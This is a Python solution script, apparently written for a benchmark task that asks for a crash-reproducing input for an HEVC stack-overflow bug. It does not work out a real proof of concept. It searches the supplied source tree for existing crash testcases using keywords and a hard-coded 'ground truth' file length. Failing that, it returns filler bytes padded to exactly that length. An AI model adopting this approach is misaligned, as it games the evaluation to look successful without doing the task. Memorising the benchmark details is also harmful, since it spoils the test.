import os
import tarfile
import tempfile
import shutil
import stat


class Solution:
    GROUND_TRUTH_LEN = 1445

    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            self._extract_tar(src_path, tmpdir)
            poc = self._find_poc_file(tmpdir)
            if poc is not None:
                return poc
            return self._fallback_payload()
        finally:
            try:
                shutil.rmtree(tmpdir)
            except Exception:
                pass

    def _extract_tar(self, src_path: str, dst_dir: str) -> None:
        with tarfile.open(src_path, "r:*") as tf:
            # Basic safety: avoid path traversal
            for member in tf.getmembers():
                member_path = os.path.join(dst_dir, member.name)
                abs_dst = os.path.abspath(dst_dir)
                abs_member = os.path.abspath(member_path)
                if not abs_member.startswith(abs_dst + os.sep) and abs_member != abs_dst:
                    continue
                tf.extract(member, dst_dir)

    def _find_poc_file(self, root: str):
        binary_exts = {
            ".mp4",
            ".hvc",
            ".hevc",
            ".265",
            ".bin",
            ".dat",
            ".mkv",
            ".ts",
            ".mpg",
            ".mpeg",
            ".raw",
            ".yuv",
            ".ivf",
            ".bit",
            ".bs",
            ".stream",
        }
        keywords = [
            "poc",
            "crash",
            "42537907",
            "oss-fuzz",
            "ossfuzz",
            "clusterfuzz",
            "testcase",
            "hevc",
            "h265",
            "hvc",
            "gf_hevc",
            "stack-overflow",
            "stack_overflow",
            "overflow",
        ]

        candidates = []
        gt_len = self.GROUND_TRUTH_LEN

        for dirpath, _, filenames in os.walk(root):
            for fname in filenames:
                fpath = os.path.join(dirpath, fname)
                try:
                    st = os.stat(fpath)
                except OSError:
                    continue
                if not stat.S_ISREG(st.st_mode):
                    continue
                size = st.st_size
                if size == 0:
                    continue

                relpath = os.path.relpath(fpath, root)
                name_lower = fname.lower()
                rel_lower = relpath.lower()
                ext = os.path.splitext(name_lower)[1]

                is_bin_ext = ext in binary_exts
                has_kw = any(k in name_lower for k in keywords) or any(
                    k in rel_lower for k in keywords
                )

                try:
                    with open(fpath, "rb") as f:
                        head = f.read(512)
                except OSError:
                    continue

                is_binary = self._is_probably_binary(head)

                score = 0.0

                if is_bin_ext:
                    score += 10.0
                if has_kw:
                    score += 20.0
                if is_binary:
                    score += 5.0
                else:
                    score -= 10.0

                # Prefer sizes close to ground-truth length
                if size > 0:
                    score += max(0.0, 10.0 - (abs(size - gt_len) / 100.0))

                # Penalize very large files
                if size > 2_000_000:
                    score -= 20.0

                if size == gt_len:
                    score += 30.0

                if score > 0:
                    # tie-breakers: closer size to GT, then smaller size
                    candidates.append((score, -abs(size - gt_len), -size, fpath))

        if not candidates:
            return None

        candidates.sort(reverse=True)
        best_path = candidates[0][3]
        try:
            with open(best_path, "rb") as f:
                return f.read()
        except OSError:
            return None

    @staticmethod
    def _is_probably_binary(data: bytes) -> bool:
        if not data:
            return False
        if b"\x00" in data:
            return True
        # Define a set of bytes typically allowed in text
        allowed = set(range(0x20, 0x7F))
        allowed.update({7, 8, 9, 10, 12, 13, 27})
        nontext = 0
        for b in data:
            if b not in allowed:
                nontext += 1
        return nontext > len(data) * 0.30

    def _fallback_payload(self) -> bytes:
        # Construct a minimal MP4-like structure with ftyp + mdat, sized to 1445 bytes
        # This is a generic fallback if no better PoC candidate is found in the source tree.
        import struct

        # ftyp box: size 24 bytes
        ftyp = struct.pack(
            ">I4s4sI4s4s",
            24,
            b"ftyp",
            b"isom",
            0,
            b"isom",
            b"isom",
        )

        # Total desired length
        total_len = self.GROUND_TRUTH_LEN
        remaining = total_len - len(ftyp)

        if remaining < 8:
            # Fallback to simple padding if something goes wrong
            return b"A" * total_len

        # mdat box header is 8 bytes; rest is payload
        mdat_payload_len = remaining - 8
        mdat_header = struct.pack(">I4s", remaining, b"mdat")
        # Fill payload with a pattern that somewhat resembles video bitstream
        pattern = b"\x00\x00\x00\x01\x26"  # fake NAL start + type
        payload = (pattern * (mdat_payload_len // len(pattern) + 1))[:mdat_payload_len]

        return ftyp + mdat_header + payload